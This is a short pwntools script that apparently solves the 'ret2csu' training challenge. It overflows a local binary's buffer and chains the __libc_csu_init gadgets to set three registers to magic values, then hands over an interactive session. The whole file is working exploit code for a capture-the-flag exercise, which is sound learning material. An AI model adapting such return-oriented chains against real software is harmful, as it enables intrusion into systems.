from pwn import *

elf = ELF("./ret2csu")

p = elf.process()
raw_input("DEBUG")
pop_r12_r13_r14_r15= 0x000000000040069c

payload = b"A"*40
payload += p64(0x000000000040069a)
payload += p64(0xD4)
payload += p64(0x0)
payload += p64(0x400000)
payload += p64(0x0)
payload += p64(0xCAFEBABECAFEBABE)
payload += p64(0xD00DF00DD00DF00D)
payload += p64(0x0000000000400680)
payload += p64(0xDEADBEEFDEADBEEF)

p.sendline(payload)

p.interactive()
